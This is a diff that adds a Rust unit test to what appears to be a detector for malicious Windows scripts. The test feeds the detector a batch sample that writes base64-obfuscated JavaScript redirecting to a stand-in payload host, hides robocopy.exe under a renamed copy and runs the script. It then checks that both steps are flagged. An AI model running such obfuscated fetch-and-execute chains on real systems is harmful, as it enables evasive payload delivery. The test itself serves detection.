@@ -19510,6 +19510,33 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copied_robocopy_alias_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXJvYm9jb3B5LmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
+copy C:\Windows\System32\robocopy.exe C:\Users\Public\rc.tmp
+C:\Users\Public\rc.tmp C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rc.tmp"#)
+            )),
+            "copied robocopy alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-robocopy.example/payload")
+            }),
+            "copied robocopy generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn robocopy_default_file_set_preserves_generated_script_content() {
         let report = analyze(
             br#"echo fetch('https://robocopy-default-dir.example/payload') > C:\Work\original.js
